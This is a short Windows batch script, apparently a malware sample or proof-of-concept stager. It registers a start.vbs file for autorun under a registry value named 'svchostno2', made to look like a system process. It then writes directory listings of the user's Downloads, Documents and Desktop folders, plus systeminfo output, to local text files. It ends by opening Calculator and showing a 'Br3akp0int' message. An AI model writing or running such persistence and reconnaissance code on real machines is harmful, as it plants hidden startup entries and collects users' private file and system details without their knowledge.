@echo off
pushd "%~dp0"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v svchostno2 /t REG_SZ /d "%~dp0start.vbs" /f > nul

dir C:\Users\%username%\downloads\ /s > %~dp0d1.txt
dir C:\Users\%username%\documents\ /s > %~dp0d2.txt
dir C:\Users\%username%\desktop\ /s > %~dp0d3.txt

systeminfo > %~dp0d4.txt

timeout -t 5 /nobreak

c:\windows\system32\calc.exe

cscript //nologo msg.vbs "Hello, hit the ~Br3akp0int~!"